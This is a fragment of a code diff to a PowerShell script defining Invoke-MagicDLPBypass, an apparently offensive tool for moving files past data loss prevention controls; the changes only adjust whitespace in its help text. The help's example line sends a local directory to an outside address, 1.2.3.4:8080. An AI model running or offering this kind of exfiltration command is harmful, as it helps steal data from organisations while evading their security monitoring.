@@ -6,7 +6,7 @@ function Invoke-MagicDLPBypass{
 	        [string]$dest
 	)
 
-	 $help=@"
+	$help=@"
 	.SYNOPSIS
 	    MagicDLPBypass.
 	    PowerShell Function: Invoke-MagicDLPBypass
@@ -22,7 +22,7 @@ function Invoke-MagicDLPBypass{
 	
 	.EXAMPLE
 	    Invoke-MagicDLPBypass -dir 'C:\Temp' -dest '1.2.3.4:8080'
-	"@
+"@
 	
 	if(-not $dir -or -not $dest) { return $help; }
 	
